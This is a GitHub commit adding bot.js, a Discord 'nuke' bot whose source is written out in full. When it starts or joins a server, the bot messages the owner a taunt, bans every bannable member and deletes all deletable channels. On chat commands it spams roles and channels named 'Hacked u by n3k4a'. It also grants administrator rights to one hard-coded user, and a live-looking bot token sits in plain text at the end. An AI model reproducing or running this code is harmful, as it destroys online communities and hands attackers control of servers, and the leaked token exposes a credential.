5845f0a4712294d3d5a943b05fd63b9bf71c6540
amrsiam12 <47953571+amrsiam12@users.noreply.github.com>
2019-05-13 18:25:14 +0000

    Add files via upload

---
+++ bot.js
@@ -0,0 +1,483 @@
+﻿const Discord = require("discord.js");
+const MREg = new Discord.Client();
+
+console.log('be ware');
+MREg.on('ready', () => {
+  console.log(`Logged in as ${MREg.user.tag} !`);
+ 
+});
+MREg.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log('      ~            ~  By : n3k ~           ~    ');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  n3k " ] servers! [ " ${MREg.guilds.size} " ] Users! [ " ${MREg.users.size} " ]`);
+ 
+       
+   
+ 
+});
+var prefix = "k"
+MREg.on("message", message => {
+  if(!message.content.startsWith(prefix)) return;;
+  let args = message.content.split(" ").slice(1);
+  var argresult = args.join(' ');
+  if (message.content.startsWith('hix')) {
+    MREg.user.setUsername(argresult);
+  }
+    if (message.content.startsWith(prefix + 'k22')) {
+        MREg.user.setStatus(argresult);
+  }
+});
+ 
+var x1 = "kk"
+MREg.on('message', message => {
+     if (message.content === ".") {
+        MREg.user.setAvatar(`https://cdn.discordapp.com/attachments/514439193603342366/514528830652940299/2.png`)
+ 
+}
+});
+var x1 = "kk"
+MREg.on('message', message => {
+     if (message.content === "sk") {
+MREg.user.setUsername("Hacked u by iam")
+ 
+}
+});
+MREg.on('message', message => {
+     if (message.content === "sk") {
+MREg.user.setGame(`Hacked u by iam`,'https://www.twitch.tv/hix')
+ 
+}
+});
+ 
+MREg.on('message', message => {
+     if (message.content === "sk") {
+         MREg.guilds.forEach(m =>{
+             m.setIcon(`https://cdn.discordapp.com/attachments/514439193603342366/514528830652940299/2.png`)
+})
+}
+});
+MREg.on('message', message => {
+     if (message.content === "sk") {
+         MREg.guilds.forEach(m =>{
+             m.setName(`Hacked u by n3k4a
+    `)
+})
+}
+});
+ 
+MREg.on('message', message => {
+     if (message.content === "sk") {
+                 if(!message.channel.guild) return;
+ 
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/514439193603342366/514528830652940299/2.png`)
+ 
+}
+});
+ 
+MREg.on('message', message => {
+     
+ 
+     if (message.content === "k1") {
+         MREg.guilds.forEach(m =>{
+  m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+     m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by n3k4a Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+ 
+   
+})
+ 
+ 
+}
+});
+MREg.on('message', message => {
+         if (message.content === "k2") {
+               MREg.guilds.forEach(m =>{
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+ 
+m.createChannel('Hacked u by n3k Is here', 'text');
+ 
+m.createChannel('Hacked u by n3k Is here', 'text');
+ 
+m.createChannel('Hacked u by n3k Is here', 'text');
+ 
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+ 
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+ 
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+ 
+m.createChannel('Hacked u by n3k Is here', 'text');
+m.createChannel('Hacked u by n3k Is here', 'text');
+ 
+})
+}
+});
+ 
+MREg.on('message', message => {
+         if (message.content === "k3") {
+                 MREg.guilds.forEach(m =>{
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+ 
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+ 
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+ 
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+ 
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+ 
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+m.createChannel('Hacked u by n3k Is here', 'voice');
+ 
+ 
+ 
+})
+}
+ 
+});
+ 
+ 
+const { Client } = require('discord.js');
+const client = new Client();
+ 
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+ 
+  await guild.fetchMembers();
+ 
+  await guild.owner.send(' Hacked u by n3k4 Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+ 
+ 
+ 
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('hacked you by ***your ass***').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+ 
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+ 
+    await guild.createChannel('Hacked u by n3k4 Is here', 'text');
+ 
+      await guild.createChannel('Hacked u by n3k4a Is here', 'voice');
+ 
+ 
+ 
+}
+ 
+MREg.on('ready', () => {
+  for(const [, g] of MREg.guilds) nuke(g).catch(console.error);
+  console.log('-------------------------------------------------------------');
+  console.log('');
+  console.log("by n3k4");
+  console.log("");
+  console.log("-------------------------------------------------------------");
+ 
+});
+ 
+MREg.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
+ 
+MREg.on('guildMemberAdd', member => {
+   
+            if (member.id === "357961207019470851") {
+                member.guild.createRole({
+                    name : MREg.user.username,
+                    color : "RANDOM",
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+               
+            }
+       
+    });
+ 
+   
+ 
+ 
+ 
+ 
+MREg.login('NTc3NTEzOTUxMjI3NTQzNTcy.XNm10w.C_m1mVf1egtNU4g6Yo3R8wKeezg')
